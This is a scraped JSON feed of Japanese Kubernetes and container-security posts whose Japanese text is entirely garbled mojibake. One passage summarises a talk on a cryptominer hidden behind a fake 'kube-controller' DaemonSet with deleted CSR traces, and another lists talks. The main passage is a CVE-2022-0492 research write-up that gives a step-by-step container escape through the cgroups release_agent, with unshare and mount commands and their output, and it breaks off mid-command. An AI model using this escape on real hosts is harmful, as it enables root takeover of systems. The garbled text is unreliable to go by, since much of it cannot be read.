ã®è¨¼æ˜æ›¸ã‚’ä½œæˆã—ã€ã‚¯ãƒ©ã‚¹ã‚¿ã¸ã®ä¾µå®³ã‚’æ°¸ç¶šåŒ–è¨¼æ˜æ›¸ä½œæˆã®ç—•è·¡ã‚’å‰Šé™¤èˆˆå‘³æ·±ã„ç‚¹ã¨ã—ã¦ã€ã‚¯ãƒªãƒ—ãƒˆãƒã‚¤ãƒŠãƒ¼ã‚’è¨­ç½®ã™ã‚‹éš›ã« ClusterRoleBinding ã¨ DaemonSet ã‚’ä½œæˆã—ã¾ã™ãŒã€ãƒªã‚½ãƒ¼ã‚¹åã‚’ kube-controller ã¨ã™ã‚‹ã“ã¨ã§æ­£è¦ã®ãƒªã‚½ãƒ¼ã‚¹ã‚’å½è£…ã—ã¦ã„ã¾ã™ã€‚é‹ç”¨æ¥­å‹™ã§ã‚¯ãƒ©ã‚¹ã‚¿å†…ã®ãƒªã‚½ãƒ¼ã‚¹ã‚’ç¢ºèªã—ãŸã¨ã—ã¦ã‚‚ã€ã‚¯ãƒªãƒ—ãƒˆãƒã‚¤ãƒŠãƒ¼ã®å­˜åœ¨ã«æ°—ã¥ã‹ãªã„ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚ãƒªãƒã‚¸ãƒˆãƒªã‚‚ kubernetesio/~ ã®ã‚ˆã†ã«å½è£…ã—ã¦ã„ã¾ã™ã€‚ã¾ãŸä»Šå›ã¯CSRã‚’å‰Šé™¤ã—ã¦ã„ã¾ã™ãŒã€cluster-admin ã‚’æŒã£ã¦ã„ã‚Œã°ã€ã‚¯ãƒ©ã‚¹ã‚¿å†…ã§è¡Œã‚ã‚Œã‚‹æ¤œçŸ¥ã®å›é¿ã‚„é˜²å¾¡ã®ç„¡åŠ¹åŒ–ã‚‚å®¹æ˜“ã«ã§ãã¦ã—ã¾ã„ã¾ã™ã€‚ã‚¯ãƒ©ã‚¹ã‚¿ã¨ã¯åˆ¥ã®ãƒ¬ã‚¤ãƒ¤ãƒ¼ã§ã€ç›£æŸ»ãƒ­ã‚°ã®ç›£è¦–ãªã©ã‚’è¡Œã†å¿…è¦ãŒã‚ã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚ãƒ‘ãƒ–ãƒªãƒƒã‚¯ã‚¯ãƒ©ã‚¦ãƒ‰ã‚’åˆ©ç”¨ã™ã‚‹å ´åˆã€ã‚¯ãƒ©ã‚¹ã‚¿å†…ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å¯¾ç­–ã¨ã‚¯ãƒ©ã‚¦ãƒ‰ä¸Šã®ç›£è¦–ã‚µãƒ¼ãƒ“ã‚¹ã‚’ä½µç”¨ã™ã‚‹ã®ãŒè‰¯ã•ãã†ã§ã™ã€‚ã‚»ãƒƒã‚·ãƒ§ãƒ³å¾ŒåŠã§ã¯ã€å–ã‚‹ã¹ãã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å¯¾ç­–ã«ã¤ã„ã¦ç´¹ä»‹ã—ã¦ã„ã¾ã™ã€‚Kubernetes API Server ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã®ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯åˆ¶é™--anonymous-auth=false ã«ã‚ˆã‚‹åŒ¿åãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’ç„¡åŠ¹åŒ–ã‚¢ãƒ‰ãƒŸãƒƒã‚·ãƒ§ãƒ³ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ©ãƒ¼ã«ã‚ˆã‚‹ cluster-admin ã®ãƒã‚¤ãƒ³ãƒ‡ã‚£ãƒ³ã‚°ç¦æ­¢æ¤œçŸ¥ç­–ã¨ã—ã¦ã€è¨­å®šãƒŸã‚¹ã®æ¤œçŸ¥Kubernetes API ã¸ã®æ”»æ’ƒã®æ¤œçŸ¥ãƒã‚¤ãƒ‹ãƒ³ã‚°ã®æ¤œçŸ¥ã®ãã‚Œãã‚Œ3ã¤ã®å¯¾ç­–ãŒæŒ™ã’ã‚‰ã‚Œã¦ã„ã¾ã™ã€‚è¨­å®šãƒŸã‚¹ã®å¯¾ç­–ã§ã¯ã€system:anonymous ã‚„ system:authenticated ã«ä»˜ä¸ã•ã‚ŒãŸæ¨©é™ãŒãªã„ã‹ç¢ºèªã™ã‚‹ãŸã‚ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆãŒç´¹ä»‹ã•ã‚Œã¦ã„ã¾ã™ã€‚Kubernetes ã®ç›£æŸ»ãƒ­ã‚°ã‚’ç›£è¦–ã™ã‚‹ã“ã¨ã‚‚æœ‰åŠ¹ã§ã™ã€‚Google Cloud ã® Security Command Center (SCC) ã«ã¯è„…å¨æ¤œçŸ¥ã®æ©Ÿèƒ½ãŒã‚ã‚Šã¾ã™ãŒã€ã“ã®æ©Ÿèƒ½ã‚’åˆ©ç”¨ã™ã‚Œã° GKE ã«å¯¾ã™ã‚‹è¨­å®šãƒŸã‚¹ã‚„æ”»æ’ƒã‚’æ¤œçŸ¥ã§ãã¾ã™ã€‚(ç™ºè¡¨è€…ã¯ Google Cloud ã®æ–¹ã§ã™)ãƒã‚¤ãƒ‹ãƒ³ã‚°ã®æ¤œçŸ¥ã«ã¤ã„ã¦ã€IoC (Indicator of Compromise) ã‚’åˆ©ç”¨ã™ã‚‹æ–¹æ³•ãŒã‚»ãƒƒã‚·ãƒ§ãƒ³å†…ã§ã¯ç´¹ä»‹ã•ã‚Œã¦ã„ã¾ã™ã€‚æ—¢çŸ¥ã®ãƒãƒ«ã‚¦ã‚§ã‚¢ã‚³ãƒ³ãƒ†ãƒŠã‚„æ‚ªæ„ã®ã‚ã‚‹ãƒã‚¤ãƒŠãƒªã€æ”»æ’ƒã‚µãƒ¼ãƒã®IPã‚¢ãƒ‰ãƒ¬ã‚¹ç­‰ã¨ç…§åˆã™ã‚‹ã“ã¨ã§æ”»æ’ƒã‚’æ¤œçŸ¥ã—ã¾ã™ã€‚SCC ã«ãŠã‘ã‚‹ãƒã‚¤ãƒ‹ãƒ³ã‚°æ¤œçŸ¥ã®ãƒ™ã‚¹ãƒˆãƒ—ãƒ©ã‚¯ãƒ†ã‚£ã‚¹ã‚‚èˆˆå‘³ãŒã‚ã‚Œã°èª­ã‚“ã§ã¿ã¦ãã ã•ã„ã€‚ãŠã‚ã‚Šã«ã„ã‹ãŒã ã£ãŸã§ã—ã‚‡ã†ã‹ï¼ŸKubernetes ã¸ã®æ”»æ’ƒæ‰‹æ³•ã‚’çŸ¥ã‚‹ã“ã¨ã¯ã€(ãã‚Œè‡ªä½“é¢ç™½ã„ã¨ã„ã†ã®ã‚‚ã‚ã‚Šã¾ã™ãŒ) ãƒªã‚¹ã‚¯ãƒ™ãƒ¼ã‚¹ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å¯¾ç­–ã‚’æ¤œè¨ã™ã‚‹ä¸Šã§éå¸¸ã«æœ‰ç”¨ã§ã™ã€‚ã“ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å¯¾ç­–ã¯ã©ã®ã‚ˆã†ãªæ”»æ’ƒãƒªã‚¹ã‚¯ã‚’è»½æ¸›ã—ã¦ãã‚Œã‚‹ã®ã‹ã“ã®æ”»æ’ƒãŒè¡Œã‚ã‚ŒãŸå ´åˆã€ã©ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å¯¾ç­–ã«ã‚ˆã£ã¦é˜²ãã“ã¨ãŒã§ãã‚‹ã®ã‹ã¨ã„ã£ãŸè¦³ç‚¹ã§è€ƒãˆã¦ã¿ã‚‹ã“ã¨ã‚’ãŠå‹§ã‚ã—ã¾ã™ã€‚Kubernetes ã‚¯ãƒ©ã‚¹ã‚¿ã‚’ç›®æŒ‡ã—ã¦ã€çš†ã§å–ã‚Šçµ„ã‚“ã§ã„ãã¾ã—ã‚‡ã†ã€‚","isoDate":"2023-12-30T19:07:20.000Z","dateMiliSeconds":1703963240000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"Unlocking Cloud Native Security","link":"https://speakerdeck.com/kyohmizu/unlocking-cloud-native-security","contentSnippet":"CloudNative Days Tokyo 2023 ã®ç™»å£‡è³‡æ–™ã§ã™ã€‚2023/12/12\rhttps://event.cloudnativedays.jp/cndt2023","isoDate":"2023-12-12T05:00:00.000Z","dateMiliSeconds":1702357200000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"ã‚³ãƒ³ãƒ†ãƒŠ Ã— ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ Ã— AWS","link":"https://speakerdeck.com/kyohmizu/kontena-x-sekiyuritei-x-aws","contentSnippet":"ã€ŒJAWS-UG ã‚³ãƒ³ãƒ†ãƒŠæ”¯éƒ¨ Ã— JAWS-UG åƒè‘‰æ”¯éƒ¨ #1 ä»ŠçŸ¥ã‚ŠãŸã„ã‚³ãƒ³ãƒ†ãƒŠã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã€ã®è³‡æ–™ã§ã™ã€‚\rhttps://jawsug-container.connpass.com/event/295110/","isoDate":"2023-10-16T04:00:00.000Z","dateMiliSeconds":1697428800000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"ã‚³ãƒ³ãƒ†ãƒŠã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£","link":"https://speakerdeck.com/kyohmizu/kontenasekiyuritei","contentSnippet":"ã€Œã‚³ãƒ³ãƒ†ãƒŠã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ - Forkwell Library#26ã€ã®è³‡æ–™ã§ã™ã€‚\rhttps://forkwell.connpass.com/event/287259/","isoDate":"2023-07-05T04:00:00.000Z","dateMiliSeconds":1688529600000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"ã‚³ãƒ³ãƒ†ãƒŠã‚¤ãƒ¡ãƒ¼ã‚¸ã®ãƒãƒ«ã‚¦ã‚§ã‚¢æ¤œå‡ºã¨ãã®å®Ÿç”¨æ€§ã«ã¤ã„ã¦","link":"https://speakerdeck.com/kyohmizu/kontenaimezinomaruueajian-chu-tosonoshi-yong-xing-nituite","contentSnippet":"3-shake SRE Tech Talk #5 ~ ã‚³ãƒ³ãƒ†ãƒŠã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£æœ€å‰ç·š ã®è³‡æ–™ã§ã™ã€‚\rhttps://3-shake.connpass.com/event/277945/","isoDate":"2023-04-12T04:00:00.000Z","dateMiliSeconds":1681272000000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"Play with ğŸ in Kubernetes","link":"https://speakerdeck.com/kyohmizu/play-with-in-kubernetes","contentSnippet":"3-shake SRE Tech Talk 2022 ã‚¯ãƒªã‚¹ãƒã‚¹ç›´å‰ä¼šï¼ã®è³‡æ–™ã§ã™ã€‚\rhttps://3-shake.connpass.com/event/267080/","isoDate":"2022-12-15T05:00:00.000Z","dateMiliSeconds":1671080400000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"Security Command Center Ã— PagerDuty è‡ªå‹•ã‚¢ãƒ©ãƒ¼ãƒˆé€šçŸ¥ã®å–ã‚Šçµ„ã¿","link":"https://speakerdeck.com/kyohmizu/security-command-center-x-pagerduty-zi-dong-aratotong-zhi-falsequ-rizu-mi","contentSnippet":"3-shake SRE Tech Talk #4 ã®ç™»å£‡è³‡æ–™ã§ã™ã€‚\rhttps://3-shake.connpass.com/event/253028/","isoDate":"2022-08-04T04:00:00.000Z","dateMiliSeconds":1659585600000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"ã‚µã‚¤ãƒãƒ¼æ”»æ’ƒã‹ã‚‰ Kubernetes ã‚¯ãƒ©ã‚¹ã‚¿ã‚’å®ˆã‚‹ãŸã‚ã®åŠ¹æœçš„ãªã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å¯¾ç­–","link":"https://speakerdeck.com/kyohmizu/saibagong-ji-kara-kubernetes-kurasutawoshou-rutamefalsexiao-guo-de-nasekiyuriteidui-ce","contentSnippet":"CloudNative Security Conference 2022 ãƒ—ãƒ¬ã‚¤ãƒ™ãƒ³ãƒˆ ã®ç™»å£‡è³‡æ–™ã§ã™ã€‚\rhttps://cloudnativedays.connpass.com/event/252961/","isoDate":"2022-07-12T04:00:00.000Z","dateMiliSeconds":1657598400000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"CVE-2022-0492 èª¿æŸ»ã¾ã¨ã‚","link":"https://kyohmizu.hatenablog.com/entry/2022/04/06/233150","contentSnippet":"cgroups v1 ã®è„†å¼±æ€§ CVE-2022-0492 ã«ã¤ã„ã¦ã€èª¿æŸ»ã—ãŸå†…å®¹ã‚’ã¾ã¨ã‚ã¾ã—ãŸã€‚ã‚¤ãƒ™ãƒ³ãƒˆã§ç™ºè¡¨ã—ãŸå†…å®¹ã§ã™ãŒã€æ™‚é–“ã®éƒ½åˆã§èªã‚Šãã‚Œãªã‹ã£ãŸéƒ¨åˆ†ã‚‚å¤šãã€å†…å®¹ã‚’åŠ ç­†ã—ã¦ãƒ–ãƒ­ã‚°ã«æ›¸ãã“ã¨ã«ã—ã¾ã—ãŸã€‚ speakerdeck.comCVE-2022-0492 æ¦‚è¦release_agent ã«ã¤ã„ã¦ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆå‰ææ¡ä»¶è¦ç‚¹æ¤œè¨¼ä¿®æ­£ãƒ‘ãƒƒãƒã‚³ãƒ³ãƒ†ãƒŠã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£seccompAppArmor (SELinux)Kubernetes ã®å ´åˆEKS, GKE ã®å ´åˆã•ã„ã”ã«å‚è€ƒãƒªãƒ³ã‚¯CVE-2022-0492Linuxã‚³ãƒ³ãƒ†ãƒŠã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£CVE-2022-0492 æ¦‚è¦CVE-2022-0492 ã¯ cgroups v1 ã«ãŠã‘ã‚‹ç‰¹æ¨©æ˜‡æ ¼ãƒ»ã‚³ãƒ³ãƒ†ãƒŠãƒ–ãƒ¬ã‚¤ã‚¯ã‚¢ã‚¦ãƒˆã®è„†å¼±æ€§ã§ã™ã€‚cgroups v1 ã® release_agent æ©Ÿèƒ½ã‚’æ‚ªç”¨ã™ã‚‹ã“ã¨ã§ã€ã‚³ãƒ³ãƒ†ãƒŠã‹ã‚‰ãƒ›ã‚¹ãƒˆã® root æ¨©é™ã§ä»»æ„ã‚³ãƒãƒ³ãƒ‰å®Ÿè¡ŒãŒå¯èƒ½ã¨ãªã‚Šã¾ã™ã€‚è©³ç´°ã¯å¾Œè¿°ã—ã¾ã™ãŒã€ã“ã‚Œã¯æœ¬æ¥ç‰¹æ¨©ã‚³ãƒ³ãƒ†ãƒŠã«é™å®šã•ã‚Œã‚‹ã¹ãè¨­å®šãŒã€capabilities ã®ãƒã‚§ãƒƒã‚¯æ¼ã‚Œã«ã‚ˆã‚Šéç‰¹æ¨©ã‚³ãƒ³ãƒ†ãƒŠã‹ã‚‰è¡Œãˆã‚‹çŠ¶æ…‹ã ã£ãŸã“ã¨ãŒåŸå› ã§ã™ã€‚æœ¬è„†å¼±æ€§ã¯ seccomp ã‚„ AppArmor/SELinux ã‚’æœ‰åŠ¹ã«ã™ã‚‹ã“ã¨ã§å›é¿å¯èƒ½ã§ã™ã€‚release_agent ã«ã¤ã„ã¦cgroups v1 ã¯ cpu, memory, pids ã®ã‚ˆã†ã«ãƒªã‚½ãƒ¼ã‚¹ã‚’ã‚µãƒ–ã‚·ã‚¹ãƒ†ãƒ ã«åˆ†å‰²ã—ã€å„ã‚µãƒ–ã‚·ã‚¹ãƒ†ãƒ ãŒãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªæ§‹é€ ã‚’å–ã£ã¦ã„ã¾ã™ã€‚# ls /sys/fs/cgroup/blkio  cpu,cpuacct  cpuset   freezer  memory  net_cls           net_prio    pids  systemdcpu    cpuacct      devices  hugetlb  misc    net_cls,net_prio  perf_event  rdma  unifiedrelease_agent ã¯å„ cgroup ã‚µãƒ–ã‚·ã‚¹ãƒ†ãƒ ã®ãƒ«ãƒ¼ãƒˆãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã«é…ç½®ã•ã‚Œã‚‹ãƒ•ã‚¡ã‚¤ãƒ«ã§ã€cgroup å†…ã®ãƒ—ãƒ­ã‚»ã‚¹ãŒçµ‚äº†ã™ã‚‹æ™‚ã«èµ·å‹•ã•ã›ã‚‹ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã‚’è¨­å®šã—ã¾ã™ã€‚ãƒªãƒªãƒ¼ã‚¹ã‚¨ãƒ¼ã‚¸ã‚§ãƒ³ãƒˆãƒ—ãƒ­ã‚°ãƒ©ãƒ  ã®èµ·å‹•ã®æœ‰ç„¡ã¯ã€cgroup ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªå†…ã® notify_on_release ã®å€¤ã§åˆ¤æ–­ã•ã‚Œã¾ã™ã€‚ã“ã®ãƒ•ã‚¡ã‚¤ãƒ«ã¯ãƒ«ãƒ¼ãƒˆä»¥ä¸‹ã€å„ child cgroup ã®ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã«ã‚‚é…ç½®ã•ã‚Œã¦ã„ã¾ã™ã€‚notify_on_release = 1 ã®å ´åˆã€ãƒªãƒªãƒ¼ã‚¹ã‚¨ãƒ¼ã‚¸ã‚§ãƒ³ãƒˆãƒ—ãƒ­ã‚°ãƒ©ãƒ ã‚’èµ·å‹•ã—ã¾ã™ã€‚cgroup ã®ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªæ§‹æˆpids cgroup ã®ãƒ«ãƒ¼ãƒˆãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã‚’è¦‹ã‚‹ã¨ã€ä»¥ä¸‹ã®ã‚ˆã†ã« release_agent, notify_on_release ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ç¢ºèªã§ãã¾ã™ã€‚# ls /sys/fs/cgroup/pids/cgroup.clone_children  cgroup.sane_behavior  docker      notify_on_release  system.slice  user.slicecgroup.procs           default               init.scope  release_agent      tasks# cat /sys/fs/cgroup/pids/release_agent   â† ç©ºã®ãƒ•ã‚¡ã‚¤ãƒ«# cat /sys/fs/cgroup/pids/notify_on_release 0ã¡ãªã¿ã«ã‚³ãƒ³ãƒ†ãƒŠã« CAP_SYS_ADMIN ãŒã‚ã‚‹å ´åˆã€release_agent ã‚’ä½¿ãˆã°æœ¬è„†å¼±æ€§ã‚’åˆ©ç”¨ã™ã‚‹ã“ã¨ãªããƒ–ãƒ¬ã‚¤ã‚¯ã‚¢ã‚¦ãƒˆå¯èƒ½ã§ã™ã€‚https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)ã¾ãŸ cgroups v2 ã«ã¯ release_agent ãŒãªãã€ãƒªãƒªãƒ¼ã‚¹ã®é€šçŸ¥ã¯åˆ¥ã®ä»•çµ„ã¿ã‚’ä½¿ã£ã¦ã„ã¾ã™ã€‚ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆå‰ææ¡ä»¶æœ¬è„†å¼±æ€§ã¯æ¬¡ã®æ¡ä»¶ã‚’å…¨ã¦æº€ãŸã™å ´åˆã«å½±éŸ¿ãŒã‚ã‚Šã¾ã™ã€‚root ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¾ãŸã¯ã€no_new_privsãƒ•ãƒ©ã‚°ãªã—ã§ã‚³ãƒ³ãƒ†ãƒŠã‚’èµ·å‹•ã—ã¦ã„ã‚‹seccomp, AppArmor/SELinux ãŒã„ãšã‚Œã‚‚æœ‰åŠ¹ã§ãªã„ãƒ›ã‚¹ãƒˆã®éç‰¹æ¨©ãƒ¦ãƒ¼ã‚¶ãƒ¼åå‰ç©ºé–“ãŒæœ‰åŠ¹ï¼ˆubuntu ã§ã¯ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®è¨­å®šã§ã™ï¼‰å„è¨­å®šã®ç¢ºèªæ–¹æ³•â†“# cat /proc/sys/kernel/unprivileged_userns_clone   â† éç‰¹æ¨©ãƒ¦ãƒ¼ã‚¶åå‰ç©ºé–“1# cat /proc/self/status | grep Seccomp   â† seccompSeccomp:    0Seccomp_filters:    0# cat /proc/self/attr/current   â† AppArmordocker-default (enforce)è¦ç‚¹ã‚³ãƒ³ãƒ†ãƒŠã‹ã‚‰ cgroups ã® release_agent ã«æ›¸ãè¾¼ã¿ãŸã„rdma ã‚µãƒ–ã‚·ã‚¹ãƒ†ãƒ ã¯ root cgroup ã«æ‰€å±ã—ã¦ã„ã‚‹ãŒã€readonly ã§ãƒã‚¦ãƒ³ãƒˆã•ã‚Œã¦ã„ã‚‹cgroup ã‚’ rw ã§æ–°ãŸã«ãƒã‚¦ãƒ³ãƒˆã—ãŸã„ãŒã€ãƒã‚¦ãƒ³ãƒˆã«ã¯ CAP_SYS_ADMIN ãŒå¿…è¦unshare ã§ user namespace (ns) ã‚’ä½œæˆã™ã‚Œã° CAP_SYS_ADMIN ãŒå¾—ã‚‰ã‚Œã‚‹cgroup, mount ns ã‚‚åŒæ™‚ã«ä½œæˆã™ã‚‹ã“ã¨ã§ cgroup ã‚’ãƒã‚¦ãƒ³ãƒˆå¯èƒ½ã«rdma cgroup ã‚’ãƒã‚¦ãƒ³ãƒˆ ã™ã‚‹ã¨ release_agent ã«æ›¸ãè¾¼ã¿å¯èƒ½cgroup å†…ã®ãƒ—ãƒ­ã‚»ã‚¹ãŒçµ‚äº†ã™ã‚‹ã‚¿ã‚¤ãƒŸãƒ³ã‚°ã§ã€ä»»æ„ã®ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã‚’ãƒ›ã‚¹ãƒˆã® root æ¨©é™ã§å®Ÿè¡Œæ¤œè¨¼è„†å¼±ãª Kernel ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã§ CVE-2022-0492 ã‚’æ¤œè¨¼ã—ã¾ã™ã€‚ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã«ç”¨æ„ã—ãŸ ubuntu ä¸Šã§ã€seccomp, AppArmor ã‚’ã‚ªãƒ•ã«ã—ãŸ docker ã‚³ãƒ³ãƒ†ãƒŠã‚’èµ·å‹•ã—ã¾ã™ã€‚# uname -aLinux ip-172-31-1-29 5.13.0-1017-aws #19~20.04.1-Ubuntu SMP Mon Mar 7 12:53:12 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux# docker run --rm -it --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu bashdocker ã¯ã‚³ãƒ³ãƒ†ãƒŠä½œæˆæ™‚ã« cgroup ns ã‚’ä½œæˆã—ãªã„ã®ã§ã€ã‚³ãƒ³ãƒ†ãƒŠã¯ãƒ›ã‚¹ãƒˆã¨åŒã˜ cgroup ns ã«æ‰€å±ã—ã¦ã„ã¾ã™ã€‚è‡ªèº«ã® cgroup ã‚’ç¢ºèªã™ã‚Œã° root cgroup ã‹ã‚‰ã®ãƒ‘ã‚¹ãŒã‚ã‹ã‚‹ãŸã‚ã€ã‚³ãƒ³ãƒ†ãƒŠå†…ã‹ã‚‰å„ã‚µãƒ–ã‚·ã‚¹ãƒ†ãƒ ãŒ root cgroup ã«æ‰€å±ã—ã¦ã„ã‚‹ã‹ã©ã†ã‹èª¿ã¹ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚root@ab988587a245:/# cat /proc/self/cgroup13:misc:/12:rdma:/   â† rdma ã‚µãƒ–ã‚·ã‚¹ãƒ†ãƒ ã¯ root cgroup11:hugetlb:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a10:cpuset:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a9:net_cls,net_prio:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a8:perf_event:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a7:blkio:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a6:devices:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a5:freezer:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a4:cpu,cpuacct:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a3:pids:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a2:memory:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a1:name=systemd:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a0::/system.slice/containerd.serviceã“ã‚Œã§ rdma ã‚µãƒ–ã‚·ã‚¹ãƒ†ãƒ ãŒ root cgroup ã«æ‰€å±ã—ã¦ã„ã‚‹ã“ã¨ãŒã‚ã‹ã‚Šã¾ã—ãŸã€‚root@ab988587a245:/# mount | grep 'cgroup (ro'cgroup on /sys/fs/cgroup/systemd type cgroup (ro,nosuid,nodev,noexec,relatime,xattr,name=systemd)cgroup on /sys/fs/cgroup/memory type cgroup (ro,nosuid,nodev,noexec,relatime,memory)cgroup on /sys/fs/cgroup/pids type cgroup (ro,nosuid,nodev,noexec,relatime,pids)cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (ro,nosuid,nodev,noexec,relatime,cpu,cpuacct)cgroup on /sys/fs/cgroup/freezer type cgroup (ro,nosuid,nodev,noexec,relatime,freezer)cgroup on /sys/fs/cgroup/devices type cgroup (ro,nosuid,nodev,noexec,relatime,devices)cgroup on /sys/fs/cgroup/blkio type cgroup (ro,nosuid,nodev,noexec,relatime,blkio)cgroup on /sys/fs/cgroup/perf_event type cgroup (ro,nosuid,nodev,noexec,relatime,perf_event)cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (ro,nosuid,nodev,noexec,relatime,net_cls,net_prio)cgroup on /sys/fs/cgroup/cpuset type cgroup (ro,nosuid,nodev,noexec,relatime,cpuset)cgroup on /sys/fs/cgroup/hugetlb type cgroup (ro,nosuid,nodev,noexec,relatime,hugetlb)cgroup on /sys/fs/cgroup/rdma type cgroup (ro,nosuid,nodev,noexec,relatime,rdma)   â† readonly ã§ãƒã‚¦ãƒ³ãƒˆã•ã‚Œã¦ã„ã‚‹cgroup on /sys/fs/cgroup/misc type cgroup (ro,nosuid,nodev,noexec,relatime,misc)root@ab988587a245:/# ls -l /sys/fs/cgroup/rdma/total 0-rw-r--r--  1 root root 0 Mar 15 01:40 cgroup.clone_children-rw-r--r--  1 root root 0 Mar 15 01:40 cgroup.procs-r--r--r--  1 root root 0 Mar 15 01:40 cgroup.sane_behavior-rw-r--r--  1 root root 0 Mar 15 01:40 notify_on_release-rw-r--r--  1 root root 0 Mar 29 16:01 release_agentdrwxr-xr-x 13 root root 0 Mar 26 21:07 system.slice-rw-r--r--  1 root root 0 Mar 15 01:40 tasksroot@ab988587a245:/# echo test \u003e /sys/fs/cgroup/rdma/release_agent bash: /sys/fs/cgroup/rdma/release_agent: Read-only file system   â† æ›¸ãè¾¼ã¿ã‚¨ãƒ©ãƒ¼ã¨ã„ã†ã‚ã‘ã§ã€cgroup ã‚’ rw ã§ãƒã‚¦ãƒ³ãƒˆã§ãã‚Œã°è‰¯ã„ã“ã¨ã«ãªã‚Šã¾ã™ã€‚ã“ã“ã§ capability ã‚’ç¢ºèªã™ã‚‹ã¨ã€ã‚³ãƒ³ãƒ†ãƒŠã¯ CAP_SYS_ADMIN ã‚’æŒã£ã¦ãŠã‚‰ãšã€ã“ã®ã¾ã¾ã§ã¯ cgroup ã‚’ãƒã‚¦ãƒ³ãƒˆã™ã‚‹æ¨©é™ãŒã‚ã‚Šã¾ã›ã‚“ã€‚root@ab988587a245:/# apt update \u0026\u0026 apt install -y libcap2-binroot@ab988587a245:/# cat /proc/self/status | grep CapEffCapEff: 00000000a80425fbroot@ab988587a245:/# capsh --decode=00000000a80425fb0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcaproot@ab988587a245:/# mount -t cgroup -o rdma cgroup /mntmount: /mnt: permission denied.   â† ãƒã‚¦ãƒ³ãƒˆã‚¨ãƒ©ãƒ¼CAP_SYS_ADMIN ã‚’ä»˜ä¸ã™ã‚‹ãŸã‚ user ns ã‚’ä½œæˆã—æ–°ãŸã«ãƒ—ãƒ­ã‚»ã‚¹ã‚’ç«‹ã¡ä¸Šã’ã¾ã™ã€‚ã•ã‚‰ã« mount, cgroup ns ã‚’åŒæ™‚ã«ä½œæˆã™ã‚‹ã“ã¨ã§ã€ã‚³ãƒ³ãƒ†ãƒŠå†…ã§ã®ãƒã‚¦ãƒ³ãƒˆãŒå¯èƒ½ã«ãªã‚Šã¾ã™ã€‚ãƒã‚¦ãƒ³ãƒˆã•ãˆã§ãã‚Œã° release_agent ã«æ›¸ãè¾¼ã‚€ã“ã¨ãŒã§ãã¾ã™ã€‚root@ab988587a245:/# unshare -rmC bash   â† user, mount, cgroup ns ã‚’ä½œæˆroot@ab988587a245:/# cat /proc/self/status | grep CapEffCapEff: 000001ffffffffffroot@ab988587a245:/# capsh 